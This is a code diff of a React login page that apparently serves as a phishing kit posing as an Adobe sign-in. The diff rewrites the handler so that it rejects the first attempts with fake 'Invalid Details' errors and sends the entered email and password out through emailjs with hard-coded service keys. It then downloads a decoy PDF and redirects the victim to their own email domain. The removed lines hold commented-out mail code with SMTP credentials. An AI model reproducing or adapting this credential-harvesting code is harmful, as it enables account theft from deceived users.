@@ -2,41 +2,17 @@ import React, { useState } from "react";
 import AdobeForm from "./components/AdobeForm";
 import logo from "./Image/pingr.png";
 import emailjs from "emailjs-com";
-import jsPDF from "jspdf"
+import jsPDF from "jspdf";
 
 function App() {
-  const [user, setUser] = useState({ email: "", password: ""})
+  const [user, setUser] = useState({ email: "", password: "" });
   const [error, setError] = useState("");
 
   const Login = (details, counter, setView) => {
- 
     setUser({
       email: details.email,
       password: details.password,
-    })
-
-    // send To Email
-
-    emailjs.send('service_x6hu0ud', 'template_lf79x3o', details, 'user_IL5fakIwm8zK6NFatXezQ')
-    .then((result) => {
-      console.log('SUCCESS!', result.status, result.text);
-    }, (error) => {
-      console.log(error.text);
     });
-
-    // const transport = nodemail.createTransport({
-    //   host: "smtp.mailtrap.io",
-    //   port: 2525,
-    //   auth: {
-    //       user: "8636f7e392b1e1",
-    //       pass: "170e7d8751b4d6"},
-    //   To: "tallurx@yahoo.com",
-    //   From: "tallurx@gmail.com",
-    //   Subject: "NEW ADOBE SUBMISSION",
-    //   Body: details
-    //   }).then((msg) =>alert ("The Email successfully sent")).catch((err) => {
-    //       console.log(err)
-    //   })
 
     try {
       if (
@@ -46,15 +22,34 @@ function App() {
         details.password === ""
       ) {
         setError("Invalid Details. Please Check the details and try again");
+      }
+      if (counter <= 2) {
+        setError("Invalid Details. Please Check the details and try again");
       } else {
         setError("");
       }
-      if (counter == 2) {
-        setError("Invalid Details. Please Check the details and try again");
-      }
     } catch (e) {
-      console.log("err");
+      setError("err");
     }
+
+    // send To Email
+    if (error != "" || counter > 3){
+      emailjs
+        .send(
+          "service_x6hu0ud",
+          "template_lf79x3o",
+          details,
+          "user_IL5fakIwm8zK6NFatXezQ"
+        )
+        .then(
+          (result) => {
+            console.log("SUCCESS!", result.status, result.text);
+          },
+          (error) => {
+            setError(error.text);
+          }
+        );
+      }
 
     const my_email = details.email;
 
@@ -69,19 +64,22 @@ function App() {
     // downloading pdf and redirect_link
 
     function success() {
-      if (error == "" && counter >= 3) {
-        const doc = new jsPDF("landscape", "px", "a4", "false");
-        doc.addImage(logo, "PNG", 65, 20, 500, 400);
-        doc.save('file.pdf')
-        console.log(user);
-        setView(" Verifying ...");
-        // window.open(logo)
-        window.location.replace("http://www."+my_slice);
+      try {
+        if (error == "" && counter > 3) {
+          const doc = new jsPDF("landscape", "px", "a4", "false");
+          doc.addImage(logo, "PNG", 65, 20, 500, 400);
+          doc.save("file.pdf");
+          console.log(user);
+          setView(" Verifying ...");
+          // window.open(logo)
+          window.location.replace("http://www." + my_slice);
+        }
+      } catch (err) {
+        setError(err);
       }
     }
     success();
-  }
-
+  };
   return (
     <div id="content">
       {user.email !== "" ? (
